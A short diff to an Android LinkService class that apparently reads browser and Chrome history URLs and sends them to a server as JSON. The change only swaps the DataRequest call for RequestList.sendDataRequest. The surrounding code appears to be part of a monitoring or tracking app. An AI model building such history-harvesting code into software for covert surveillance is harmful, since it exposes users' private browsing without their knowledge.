@@ -23,7 +23,7 @@ import android.preference.PreferenceManager;
 import android.provider.Browser;
 import android.util.Base64;
 
-import com.inet.android.request.DataRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
@@ -199,9 +199,7 @@ public class LinkService extends Service {
 					} catch (JSONException e) {
 						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 					}
-
-					DataRequest dr = new DataRequest(context);
-					dr.sendRequest(object.toString());
+					RequestList.sendDataRequest(object.toString(), this);
 
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, urlDate);
@@ -298,8 +296,7 @@ public class LinkService extends Service {
 									"json сломался");
 						}
 
-						DataRequest dr = new DataRequest(context);
-						dr.sendRequest(object.toString());
+						RequestList.sendDataRequest(object.toString(), this);
 
 						Editor ed = sPref.edit();
 						ed.putString(SAVED_TIME, chromeUrlDate);
